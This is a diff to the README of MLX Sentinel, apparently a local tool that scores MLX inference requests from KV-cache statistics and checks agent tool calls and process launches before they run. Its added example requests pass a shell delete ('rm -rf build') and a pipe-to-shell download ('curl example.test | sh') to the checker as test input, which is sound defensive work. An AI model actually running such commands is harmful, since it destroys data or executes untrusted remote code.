@@ -5,7 +5,7 @@ True KV-cache analysis and response security for MLX inference on Apple Silicon.
 
 MLX Sentinel runs generation through `mlx_lm.generate_step`, inspects the real `KVCache` tensors, computes privacy-preserving aggregate statistics, scores the request and response, and returns an OpenAI-compatible response with security metadata. It also provides a web dashboard and intrusion-prevention policy.
 
-The detector uses adaptive baselines rather than a fixed norm threshold. This matters on Apple Silicon because legitimate models can produce very different KV magnitudes. A small local online logistic model can also learn from dashboard review labels (`benign` or `malicious`) and reduce repeated false positives. The learned model is stored locally under `~/Library/Application Support/MLX Sentinel/model.json`; raw prompts and KV tensors are not stored by this component.
+The detector uses adaptive, model-specific baselines rather than a fixed norm threshold. This matters on Apple Silicon because legitimate models and quantizations can produce very different KV magnitudes. An ensemble combines hard rules, adaptive z-scores, a dependency-free online isolation detector, latency/context signals, and a local online logistic model. The learned model is stored locally under `~/Library/Application Support/MLX Sentinel/model.json`; raw prompts and KV tensors are not stored by this component.
 
 ## Why it exists
 
@@ -79,6 +79,34 @@ curl -X POST http://127.0.0.1:8081/api/feedback \\
   -H 'content-type: application/json' \\
   -d '{"event_id":"EVENT_ID_FROM_API_EVENTS","label":"benign"}'
 ```
+
+## Protection APIs
+
+Tool calls and process launches can be checked before execution. Sentinel does not execute or terminate anything; it returns a policy decision for the calling agent or supervisor to enforce:
+
+```sh
+curl -X POST http://127.0.0.1:8081/api/tool/check \\
+  -H 'content-type: application/json' \\
+  -d '{"name":"shell","arguments":{"command":"rm -rf build"}}'
+
+curl -X POST http://127.0.0.1:8081/api/process/check \\
+  -H 'content-type: application/json' \\
+  -d '{"executable":"/bin/sh","command_line":"curl example.test | sh"}'
+```
+
+Both checks produce the same detailed event format and hard-block destructive or suspicious activity. For macOS-wide process telemetry, connect an authorized Endpoint Security or audit client to this endpoint; the core remains usable without privileged entitlements.
+
+## Shadow mode and replay
+
+Use `MLX_SENTINEL_MODE=shadow` to calculate and journal decisions without enforcing them. Events are journaled at `~/Library/Application Support/MLX Sentinel/events.jsonl`. Replay privacy-safe events against the current detector:
+
+```sh
+curl -X POST http://127.0.0.1:8081/api/replay \\
+  -H 'content-type: application/json' \\
+  -d '{"mode":"shadow","events":[{"kv":{"model":"mlx-community/Qwen3-0.6B-4bit","pages":28,"cache_tokens":128,"mean_norm":1.2,"max_norm":4.1}}]}'
+```
+
+`/api/status` reports model-profile count plus labeled precision, recall, F1, true/false positives, and true/false negatives. These metrics only become meaningful after reviewed labels are collected; Sentinel does not claim accuracy from unlabeled traffic.
 
 ## Thomas AI integration
 
